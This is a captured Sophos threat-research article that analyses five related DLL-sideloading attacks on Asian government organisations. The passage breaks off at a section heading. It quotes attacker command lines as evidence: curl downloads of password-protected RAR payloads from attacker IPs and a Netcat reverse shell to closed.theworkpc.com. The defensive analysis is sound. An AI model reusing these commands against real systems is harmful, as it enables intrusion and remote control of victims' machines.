0-5.654-1.037-6.937-2.884-.964-1.355-1.435-3.155-1.435-5.35 0-3.152.866-5.544 2.495-6.826C71.149.726 73.175.158 75.497.158c2.938 0 5.284.913 6.543 2.54zM65.36.279h-3.507v6.73h-6.345V.278h-3.507v16.439h3.507V9.94h6.345v6.778h3.506V.278zM43.533 8.042c.938 0 1.48-.123 1.852-.469.442-.37.715-1.158.715-2.07 0-1.084-.443-1.872-1.208-2.144-.272-.1-.717-.149-1.286-.149h-4.839v4.832h4.766zm-4.766 8.674h-3.507V.278h8.223c2.889 0 3.902.295 4.988 1.504.964 1.036 1.481 2.39 1.481 3.845 0 1.725-.69 3.327-1.826 4.289-.962.813-1.854 1.058-3.728 1.058h-5.63v5.743zM21.665 4.596c-.519.813-.764 2.118-.764 3.87 0 3.845 1.333 5.595 4.297 5.595 2.913 0 4.247-1.75 4.247-5.546 0-3.847-1.308-5.571-4.247-5.571-1.606 0-2.866.592-3.533 1.652zm10.052-1.897c1.014 1.33 1.581 3.498 1.581 6.039 0 2.882-.914 5.249-2.545 6.555-1.233.986-3.11 1.528-5.333 1.528-3.162 0-5.656-1.037-6.94-2.884-.964-1.355-1.432-3.155-1.432-5.35 0-3.152.865-5.544 2.496-6.826C20.825.726 22.85.158 25.173.158c2.938 0 5.286.913 6.544 2.54z"/>
					</g>
				</svg>
				</a>
			</div>

			<!-- Search Field -->
			<div class="lg:flex justify-end flex-grow hidden" x-show="searchField" x-cloak>
				<div class="relative w-1/2 rounded-md shadow-sm">
					<form role="search" method="get" action="https://news.sophos.com/en-us/">
						<input
							type="text"
							class="block w-full text-lg text-white placeholder-gray-100 bg-blue-800 border-0 rounded-md font-sansMedium font-medium"
							placeholder="Type to Search News"
							x-ref="searchInput"
							name="s"
						/>
						<div class="absolute inset-y-0 right-0 flex items-center px-3">
							<button
								class="hover:opacity-100 opacity-60 p-1 text-xs text-white uppercase rounded-full cursor-pointer"
								type="submit"
							>
								Search							</button>
						</div>
					</form>
				</div>
			</div>

			<!-- Main Nav -->
			<div class="lg:flex items-center flex-grow hidden" x-show="!searchField" x-cloak>
				<div class="flex ml-auto">
				<ul id="menu-en-us-primary" class="primary-menu"><li id="menu-item-77773" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li id="menu-item-77772" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li id="menu-item-77774" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-85326" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-951374" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-951374"><a href="https://news.sophos.com/en-us/category/serious-security/">Naked Security<div class="menu-item-description"></div></a></li>
<li id="menu-item-83702" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>				</div>
			</div>

			<!-- Search button -->
			<div class="lg:block hidden ml-4">
				<div class="flex items-center">
					<button
					class="border-2 border-transparent hover:border-white inline-flex items-center justify-center p-2 text-white rounded-md focus:outline-none transition-colors"
					@click.prevent="searchField = !searchField; $nextTick(() => { setTimeout(() => { $refs.searchInput.focus(); }, 150);});"
					>
						<span class="sr-only">Search</span>
						<!-- Heroicon name: outline/bell -->
						<svg
							class="w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							:class="{ 'block': !searchField, 'hidden': searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
							/>
						</svg>
						<svg
							class="hidden w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							aria-hidden="true"
							:class="{ 'block': searchField, 'hidden': !searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M6 18L18 6M6 6l12 12"
							/>
						</svg>
					</button>
				</div>
			</div>

			<!-- Mobile menu button -->
			<div class="lg:hidden flex -mr-2">
				<button
					type="button"
					class="hover:text-white hover:bg-blue-800 focus:outline-none hover:ring-2 focus:ring-offset-2 focus:ring-offset-gray-300 focus:ring-white inline-flex items-center justify-center p-2 text-white rounded-md"
					aria-controls="mobile-menu"
					aria-expanded="false"
					@click="mobileMenu = !mobileMenu"
				>
					<span class="sr-only">Open main menu</span>
					<!--
						Heroicon name: outline/menu

						Menu open: "hidden", Menu closed: "block"
					-->
					<svg
					class="block w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					:class="{ 'block': !mobileMenu, 'hidden': mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M4 6h16M4 12h16m-7 6h7"
					/>
					</svg>
					<!--
						Heroicon name: outline/x

						Menu open: "block", Menu closed: "hidden"
					-->
					<svg
					class="hidden w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					aria-hidden="true"
					:class="{ 'block': mobileMenu, 'hidden': !mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M6 18L18 6M6 6l12 12"
					/>
					</svg>
				</button>
			</div>
		</div>
	</div>

	<!-- Mobile menu, show/hide based on menu state. -->
	<div
	class="lg:hidden container"
	x-show="mobileMenu"
	x-cloak
	x-transition:enter="transition-all ease-out duration-100"
	x-transition:enter-start="transform opacity-0 scale-95"
	x-transition:enter-end="transform opacity-100 scale-100"
	x-transition:leave="transition ease-in duration-75"
	x-transition:leave-start="transform opacity-100 scale-100"
	x-transition:leave-end="transform opacity-0 scale-95"
	>
		<div class="pt-2 pb-8 space-y-2">
			<div class="relative rounded-md shadow-sm">
				<form role="search" method="get" action="https://news.sophos.com/en-us/">
					<input
						type="text"
						class="focus:ring-blue-600 focus:border-blue-600 sm:text-sm block w-full placeholder-gray-600 border-gray-300 rounded-md"
						placeholder="Search News"
						name="s"
					/>
					<div
						class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none"
					>
						<button class="p-1 text-gray-500 rounded-full" type="submit">
							<span class="sr-only">Search</span>
							<!-- Heroicon name: outline/bell -->
							<svg
								class="w-4 h-4"
								xmlns="http://www.w3.org/2000/svg"
								fill="none"
								viewBox="0 0 24 24"
								stroke="currentColor"
							>
								<path
									stroke-linecap="round"
									stroke-linejoin="round"
									stroke-width="3"
									d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
								/>
							</svg>
						</button>
					</div>
				</form>
			</div>

			<ul id="menu-en-us-primary-1" class="mobile-menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-951374"><a href="https://news.sophos.com/en-us/category/serious-security/">Naked Security<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>		</div>
	</div>
</header>

	<div id="content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-87792" class="post-87792 post type-post status-publish format-standard has-post-thumbnail hentry category-threat-research tag-dll-side-load tag-featured tag-sophos-x-ops tag-x-ops region-en-us">

		<div class="md:mt-16 container mt-8">
		<div class="relative max-w-5xl mx-auto">
				<div
						class="aspect-w-16 aspect-h-9 flex bg-gray-400 bg-right bg-no-repeat bg-cover"
				>
					<img width="1200" height="797" src="https://news.sophos.com/wp-content/uploads/2022/11/shutterstock_188747756.jpg?w=1200" class="object-cover wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="https://news.sophos.com/wp-content/uploads/2022/11/shutterstock_188747756.jpg 4288w, https://news.sophos.com/wp-content/uploads/2022/11/shutterstock_188747756.jpg?resize=300,199 300w, https://news.sophos.com/wp-content/uploads/2022/11/shutterstock_188747756.jpg?resize=768,510 768w, https://news.sophos.com/wp-content/uploads/2022/11/shutterstock_188747756.jpg?resize=1024,680 1024w, https://news.sophos.com/wp-content/uploads/2022/11/shutterstock_188747756.jpg?resize=1536,1020 1536w, https://news.sophos.com/wp-content/uploads/2022/11/shutterstock_188747756.jpg?resize=2048,1360 2048w" sizes="(max-width: 1200px) 100vw, 1200px" />				</div>
								<div
						class="left-4 w-24 h-24 lg:left-12 xl:left-16 lg:w-40 lg:h-40 place-items-center absolute top-0 grid  "
				>
										<img
							src="https://news.sophos.com/wp-content/uploads/2022/07/Category-Icon-X-Ops-v2.png"
							alt="Threat Research"
					/>
														</div>
						</div>
	</div>


			
	<header>
		<div class="container mt-8 md:mt-16 md:-mb-4">
			<div class="max-w-4xl mx-auto">

				<h1 class="text-style-h1 mb-8">Family Tree: DLL-Sideloading Cases May Be Related</h1>
									<div class="text-xl md:text-2xl -mt-2 mb-6">
						A threat actor’s repeated use of DLL-hijack execution flow makes for interesting attack results, including omnivorous file ingestion; we break down five cases and find commonalities					</div>
				
				<div class="text-xl md:text-xl -mt-2">
					<span class="byline">
		Written by 				<span class="author vcard">
				<a href="https://news.sophos.com/en-us/author/gabor-szappanos/" title="Posts by Gabor Szappanos" class="author url fn" rel="author">Gabor Szappanos</a>				</span>
								</span>
						</div>

				<div class="text-sophos-gray-600 mt-4 text-xs font-sansSemiBold font-semibold leading-tight uppercase">
					<span class="posted-on"><a href="https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/" rel="bookmark">November 03, 2022</a></span>				</div>

				<div class="mt-6 space-y-2 space-x-1">
					<a href="https://news.sophos.com/en-us/category/threat-research/" class="category-tag-pill">Threat Research</a> <a href="https://news.sophos.com/en-us/tag/dll-side-load/" class="category-tag-pill">DLL Side-load</a> <a href="https://news.sophos.com/en-us/tag/featured/" class="category-tag-pill">featured</a> <a href="https://news.sophos.com/en-us/tag/sophos-x-ops/" class="category-tag-pill">Sophos X-Ops</a> <a href="https://news.sophos.com/en-us/tag/x-ops/" class="category-tag-pill">x-ops</a>				</div>
			</div>
		</div>
	</header><!-- .entry-header -->

	<div class="container md:my-16 xl:my-24 my-8">
	<div class="entry-content lg:prose-lg mx-auto prose max-w-4xl">
		<p>We have observed multiple attacks targeting government organizations in Asia, all involving DLL sideloading – historically a favorite technique of China-based APT groups &#8212; <a href="https://news-sophos.go-vip.net/wp-content/uploads/sites/2/2013/05/sophosszappanosplugxmalwarefactoryversion6-rev3.pdf">as far back as 2013</a> and <a href="https://news.sophos.com/en-us/2020/11/04/a-new-apt-uses-dll-side-loads-to-killlsomeone/">as recently as 2020</a>. In this article, we look at the evidence that connects five of them, showing how threat actors base their attacks on well-known, effective techniques, adding complexity and variation over time. Understanding how cases are related helps defenders (and customers) think about not just who’s doing the attacking, but about what kind of threats may be afoot – and, naturally, how to prioritize analysis and defense for best results.</p>
<p>In the most interesting of the five cases, a USB worm infected organizations in Southeast Asia. This worm copies everything it finds in specific directories when replicating itself, including components of other APT attacks by <a href="https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-june-mustang-panda/">Mustang Panda</a> and <a href="https://securelist.com/apt-luminousmoth/103332/">LuminousMoth</a>. We don’t have any evidence that the three APTs are linked, and we also know that multiple USB worms, when infecting systems simultaneously, may inadvertently combine their files.  (This is similar to <a href="https://en.wikipedia.org/wiki/Macro_and_security#%22Mating%22_macro_viruses">macro virus mating</a>, a phenomenon identified <a href="https://www.sciencedirect.com/science/article/pii/S016740489788131X">over twenty-five years ago</a>.)</p>
<p>The case involving the USB worm has significant overlap with the other four cases we observed, including loader DLLs using the same kind of code flow obfuscation and identical loader shellcode. We can’t be sure that it’s the same threat actor behind both the USB worm case and the other attacks – it may be different threat actors with access to the same tooling – but the similarities are compelling.</p>
<p>We’ll take a deep dive into all five cases, further detailing the infection timeline of the USB-worm attack in an appendix. We’ll spotlight a piece of shell code that seems to be the common thread in all five cases, and then dig into extended step-by-step breakdowns of seven scenarios we associate with these cases. We’ll close with indicators of compromise associated with these cases, which we will also make available on our GitHub.</p>
<p>Before all that, though, it’s worth briefly defining what DLL sideloading is, as it’s often confused with a similar attack called DLL preloading.</p>
<h2>About DLL sideloading and preloading</h2>
<p>DLL sideloading and preloading (sometimes known as search-order hijacking) are both attacks that hijack execution flow, although there is a subtle distinction between them.</p>
<p><strong>DLL preloading (AKA search order hijacking) – </strong><a href="https://attack.mitre.org/techniques/T1574/001/"><strong>T1574/001</strong></a></p>
<ul>
<li>An attacker plants a malicious DLL in a directory that will be searched by a pre-existing application before the location of a legitimate library (based on the <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">default Windows search order)</a>.</li>
<li>For example, if a legitimate application has to load <em>dll</em> and doesn’t specify a location, it will search the current directory first, then other directories as per the Windows search order.</li>
<li>If an attacker has write permissions to a directory in the search order list, they can plant a malicious DLL called <em>dll </em>in that directory<em>,</em> which the application will then load (assuming the legitimate DLL has not already been loaded into memory, and wasn’t found in any previous search locations).</li>
<li>The attacker then waits for the pre-existing legitimate application to be executed, or forces this process (e.g., by rebooting the machine).</li>
</ul>
<p><strong>DLL sideloading – </strong><a href="https://attack.mitre.org/techniques/T1574/002/"><strong>T1574/002</strong></a></p>
<ul>
<li>As above, except the attacker plants and invokes a legitimate application that loads the malicious DLL. This allows the attacker to take advantage of the trust the system already has in the application.</li>
<li>This technique has been used by various threat actors, <a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/revil-ransomware-uses-dll-sideloading/">including REvil</a>.</li>
</ul>
<h2>User cases</h2>
<p>A number of user reports led us to initially spot the threat actor’s activities. We’ll start with the most basic case and progress to the four more complex examples.</p>
<h3>Case 1: Basic Bad Behavior</h3>
<p>This was the case that first drew our attention to the malicious server 91.245.253[.]52, which appears repeatedly in these attacks.</p>
<p>This case came to light thanks to a stager alert (DynamicShellcode) received from a customer. The malicious payload (SSCE5532.dll) was executed via the command prompt, as shown in the following process trace:</p>
<pre>1  C:\Windows\SysWOW64\rundll32.exe [5624]
rundll32.exe  SSCE5532.dll RunMain
2  C:\Windows\System32\rundll32.exe [7864]
rundll32.exe  SSCE5532.dll RunMain
3  C:\Windows\System32\cmd.exe [3288]
4  C:\Windows\explorer.exe [4628]</pre>
<p>The threat actor placed the malicious DLL on the desktop. It executed shellcode for a standard Metasploit (or, possibly, Cobalt Strike) reverse HTTP shell, connecting to the following attacker-controlled server:</p>
<pre>91.245.253.52:6060/rKVI</pre>
<h3>Case 2: Double Trouble</h3>
<p>We started looking for other cases involving the 91.245.253[.]52 server, and we found them. This one involves <em>two</em> DLL sideloading attacks.</p>
<h4>2.1: First sideloading attack</h4>
<p>The initial infection consists of ciscocollabhost.exe, a clean and digitally signed Cisco application that, on execution, loads ciscosparklauncher.dll, a malicious DLL.</p>
<p>Our telemetry indicates that ciscosparklauncher.dll is a loader and that the payload could be a file named 2831329086.inf, located in the same directory.</p>
<p>Next, a password-protected RAR archive is downloaded from a distribution server and unpacked, as shown in these command lines:</p>
<pre>http://5.252.178.162/IJOINOIS/c.rar -o 
C:\\users\\public\\libraries\\c.rar",
    "commandLine" : "c:\\windows\\system32\\cmd.exe /C 
c:\\progra~1\\winrar\\rar.exe x -hpNONI*(uy23oninjfoisjnsofnsc 
C:\\users\\public\\libraries\\c.rar  C:\\Users\\Public\\libraries"</pre>
<p>The RAR archive contains the following files:</p>
<pre>86f7661039a0855be8d6d1cb55391f398932e80c  googleupdate.exe (clean VLC EXE)
ed67a11646c1b28bc856941743331acb47f1b7b4  goopdate.ja (encrypted implant)
e5be6f621c4a10372837baf795a37b1caa942d23  libvlc.dll (malicious loader)
b2eb8516ab136aa44106c13cc859dcee77d1bc1f  loader.ja (encrypted implant)
d90355d2a53b662c1d3fe7ab4430d3955a54f73f  time.sig (encrypted config)</pre>
<h4>2.2: Second sideloading attack</h4>
<p>Next, the executable googleupdate.exe (which, despite its name, has nothing to do with Google; it’s a clean, digitally signed VLC Media Player application) in c.rar is used to sideload libvlc.dll, a malicious loader that loads the payloads from the encrypted implants in the archive.</p>
<p>Conveniently, those implants write out detailed debug logs on their progress:</p>
<p>p1-p11: privilege escalation progress messages<br />
x1-x4: module execution progress messages</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image1.png"><img decoding="async" class="alignnone size-full wp-image-87827" src="https://news.sophos.com/wp-content/uploads/2022/11/image1.png" alt="A debugger screenshot showing events being logged" width="640" height="648" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image1.png 654w, https://news.sophos.com/wp-content/uploads/2022/11/image1.png?resize=296,300 296w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p><em>Figure 1: Events conveniently logged</em></p>
<p>Once this second sideloading attack is complete, the malware connects to the stager server, this time over port 443.</p>
<h3>Case 3: Something Extra</h3>
<p>This attack was detected by Sophos’ HeapHeapProtect dynamic-shellcode mitigation, which prevents code running in heap space from adding arbitrary code into the memory space of the original application, and similarly prevents lateral code injection into other applications (and flags the attempt). As in the previous case, this attack featured two sideloading attempts. In fact, the first was exactly the same as seen in the previous two cases.</p>
<h4>3.1: First sideloading attack</h4>
<p>The first attack featured the same executable and malicious DLL as we saw in the other cases, and we once again observed a connection to 91.245.253[.]52. Next came the downloading and unpacking of a password-protected RAR file, using a different distribution server:</p>
<pre>         "commandLine" : "curl  -k 
http://103.253.72.116/akjsdnfkjsnjfekse/walk.rar -o 
C:\\users\\public\\libraries\\walk.rar",
         "commandLine" : "C:\\Progra~1\\WinRAR\\Rar.exe  x -
hplic\\down443 C:\\users\\public\\libraries\\walk.rar 
C:\\Users\\Public\\Downloads\\",</pre>
<p>The walk.rar archive contained six files: three encrypted implants and an encrypted config (all with a PLG extension), a clean executable (Netsky.exe, a Razer Chromium Render Process), and a malicious DLL (RzLog4CPP_Logger.dll).</p>
<h4>3.2: Second sideloading attack</h4>
<p>The second attack used the loader Netsky.exe and the malicious RzLog4CPP_Logger.dll from the first part of the attack, which decrypts and loads alloc.plg, one of the encrypted implants. In turn, this implant loads the others.</p>
<p>We also noted that the attacker executed 2.exe, with the path of NetSky.exe as an argument. The function of this executable is currently unclear.</p>
<h3>Case 4: The Worm Circus</h3>
<p>We found this case by running a <a href="https://support.virustotal.com/hc/en-us/articles/360001293377-Retrohunt">VirusTotal RetroHunt</a> using the characteristics of the sideloading DLLs we spotted in the previous cases. Of the five cases we’ll cover, this could be considered the most complex, and we will return to it later in this article when we do a deeper analysis of infection timelines for these cases. It includes three sideloading efforts.</p>
<p>We noted a significant code overlap (especially in the loader shellcode) between this case and the other sideloading cases discussed so far, so we think this was also run by the same threat actor. However, the payload turned out to be totally different: a USB worm. We’re uncertain as to the purpose of this worm. It collects all files from the root of the USB drives and copies them as the infection spreads to other devices. It could be a deliberate data exfiltration method, or just an unwanted side effect of the propagation process.</p>
<p>In this case, the threat actor used a clean usbconfig.exe executable using multiple names (disk_watch.exe, usb drive.exe, and Removable Disk.exe); an encrypted implant (usb.ini); and u2ec.dll, a malicious loader for the implant.</p>
<h4>4.1: USB worm mating</h4>
<p>In Case 4, we observed sideloading components from two other APT groups &#8212; <a href="https://blog.talosintelligence.com/2022/05/mustang-panda-targets-europe.html">Mustang Panda</a> and <a href="https://securelist.com/apt-luminousmoth/103332/">LuminousMoth</a> – in the same directory as files from the original threat actor. We think that the presence of these two additional APTs is collateral damage during the file-collection process, rather than an indication of collusion.</p>
<p>The files corresponding to the sideloading attack included disk_watch.exe and u2ec.dll.  Files corresponding to Mustang Panda included rzlog4cpp.dll (a Mustang Panda reverse shell, not to be confused with the RzLog4CPP_Logger.dll we saw in Case 3), wuwebv.exe (a clean but renamed copy of Netcat), and two DLLs that were clean dependencies of Netcat.</p>
<p>The rzlog4cpp.dll establishes a reverse shell by invoking the Netcat component with the following command line:</p>
<pre>cmd.exe /C wuwebv.exe -t -e c:\windows\system32\cmd.exe 
closed.theworkpc.com 80</pre>
<p>Files corresponding to LuminousMoth included msbuild.exe, a clean Silverlight launcher; and version.dll, a malicious DLL. The latter file is also a USB worm, operating in a similar way as the usb.ini implant mentioned previously in Case 4. It is associated with LuminousMoth APT activities <a href="https://www.kaspersky.com/about/press-releases/2021_rare-mass-advanced-threat-campaign-targets-more-than-a-thousand-users-in-southeast-asia">seen</a> in 2021.</p>
<p>We identified one other component, a clean copy of Microsoft’s WinWord.exe. Its role is unknown, although Kaspersky researchers have speculated that it may have been used to sideload a malicious DLL, wwlib.dll.</p>
<h3>Case 5: Triple Threat</h3>
<p>The last case we’ll examine involved three different sideloading attacks, as Case 4 did (though no worm was detected). We covered the first two attacks in Case 3, although we noticed a slight difference this time. The “Triple Threat” also has echoes of Case 2, as you’ll see.</p>
<h4>5.1: First sideloading attack</h4>
<p>As in Case 2, the threat actor used ciscocollabhost.exe and ciscosparklauncher.dll, and downloaded, unpacked, and executed c.rar from 5.252.178[.]162/IJOINOIS.</p>
<p>However, this time the threat actor also downloaded and executed an additional password-protected RAR archive, v1.rar, from 103.253.72.[.]116/_akjsdnfkjsnjfekse. (We saw that IP address already, in Case 3.) v1.rar contains clean copies of smstore.exe and msvcrt.dll (both legitimate Microsoft files) and SYSMSRV.dll, a malicious DLL.</p>
<h4>5.2: Second sideloading attack</h4>
<p>This attack used googleupdate.exe (the clean VLC executable) and libvlc.dll, a malicious DLL, as described in Case 2.</p>
<pre>c:\users\public\libraries\out\googleupdate.exe :  
6f924de3f160984740fbac66cf9546125330fc00f4f5d2dbf05601d9d930b7d9
c:\users\public\libraries\out\libvlc.dll : 
2fd75763307c5aec5603adc6d02a7c5f34d605a0989e856001b4ae2eef2b4327</pre>
<h4>5.3: Third sideloading attack</h4>
<p>This attack used the same files from v1.rar, although the threat actor also used a UAC bypass trick to execute commands – including an unidentified file, 3.exe. (We’ll detail this bypass trick below as Scenario 5.) As with “2.exe” in Case 3, the purpose of this executable is unknown.</p>
<h2>The common thread: Loader shellcode</h2>
<p>We’ve lain out five cases; let’s look at the common threads.</p>
<p>First, the malicious server 91.245.253[.]52 – our first clue in the investigation, as noted in Case 1 &#8212; made an appearance in every case. Other interesting traces are shown in the chart below.</p>
<table style="border-collapse: collapse;width: 608pt" width="810">
<tbody>
<tr style="height: 14.25pt">
<td class="xl18" style="width: 169pt;height: 14.25pt;text-align: center" width="225" height="19"></td>
<td class="xl18" style="width: 88pt;text-align: center" width="117"><strong>Case 1</strong></td>
<td class="xl18" style="width: 88pt;text-align: center" width="117"><strong>Case 2</strong></td>
<td class="xl18" style="width: 88pt;text-align: center" width="117"><strong>Case 3</strong></td>
<td class="xl18" style="width: 88pt;text-align: center" width="117"><strong>Case 4</strong></td>
<td class="xl18" style="width: 88pt;text-align: center" width="117"><strong>Case 5</strong></td>
</tr>
<tr style="height: 43.5pt">
<td class="xl16" style="width: 169pt;height: 43.5pt;text-align: center" width="225" height="58"><strong>No. of sideloaders present</strong></td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">0<span class="font5"> </span></td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">2</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">2</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">1 + fragments of unrelated attacks</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">3</td>
</tr>
<tr style="height: 14.25pt">
<td class="xl19" style="width: 169pt;height: 14.25pt;text-align: center" width="225" height="19"><strong>91.245.253[.]52 called</strong></td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Yes</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Yes</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Yes</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Yes</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Yes</td>
</tr>
<tr style="height: 14.25pt">
<td class="xl16" style="width: 169pt;height: 14.25pt;text-align: center" width="225" height="19"><strong>5.252.72[.]116 called</strong></td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">Yes</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">Yes</td>
</tr>
<tr style="height: 14.25pt">
<td class="xl19" style="width: 169pt;height: 14.25pt;text-align: center" width="225" height="19"><strong>103.253.72[.]116 called</strong></td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Yes</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Yes</td>
</tr>
<tr style="height: 14.25pt">
<td class="xl16" style="width: 169pt;height: 14.25pt;text-align: center" width="225" height="19"><strong>UAC bypass present</strong></td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">Yes</td>
</tr>
<tr style="height: 115.5pt">
<td class="xl19" style="width: 169pt;height: 115.5pt;text-align: center" width="225" height="154"><strong>Clean application(s) abused</strong></td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">None</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Cisco Webex, VLC Media Player</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Cisco Webex Razer Chromium Render Process</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Netcat; SilverLight (via LuminousMoth), WinWord (purpose unclear), Cisco, VLC Media Player</td>
<td class="xl19" style="width: 88pt;text-align: center" width="117">Cisco Webex, Microsoft Symbol Server Builder, VLC Media Player</td>
</tr>
<tr style="height: 14.25pt">
<td class="xl16" style="width: 169pt;height: 14.25pt;text-align: center" width="225" height="19"><strong>USB worm included</strong></td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">Yes</td>
<td class="xl16" style="width: 88pt;text-align: center" width="117">No</td>
</tr>
</tbody>
</table>
<p><em>Table 1: Various traces and IoCs noted among the five DLL sideloading cases</em></p>
<p>More significantly, when the sideloader DLL decrypts the plugin, it follows the execution by jumping to the first byte of the file. The file content of the decrypted plugin starts with a short PE loader shellcode, which loads the encrypted plugin DLL. This loader shellcode is the same in all seven scenarios described in the following sections, which establishes a strong connection among them.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image2.png"><img decoding="async" class="alignnone wp-image-87828 size-full" src="https://news.sophos.com/wp-content/uploads/2022/11/image2.png" alt="Screenshot of a disassembly showing the loader shellcode" width="524" height="734" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image2.png 524w, https://news.sophos.com/wp-content/uploads/2022/11/image2.png?resize=214,300 214w" sizes="(max-width: 524px) 100vw, 524px" /></a></p>
<p><em>Figure 2: The shared loader shellcode</em></p>
<p>Similar to <a href="https://www.sophos.com/en-us/medialibrary/pdfs/technical%20papers/plugx-thenextgeneration.pdf">PlugX loaders</a>, this shellcode loader overwrites the first 0x1000 bytes of the decrypted and loaded plugin DLL with zero bytes.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image3.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87829" src="https://news.sophos.com/wp-content/uploads/2022/11/image3.png" alt="Screenshot of a disassembly showing a loop" width="640" height="625" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image3.png 866w, https://news.sophos.com/wp-content/uploads/2022/11/image3.png?resize=300,293 300w, https://news.sophos.com/wp-content/uploads/2022/11/image3.png?resize=768,750 768w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p><em>Figure 3: The loop that fills the first 0x1000 bytes with zero bytes</em></p>
<h2>Under the hood: Five cases, seven scenarios</h2>
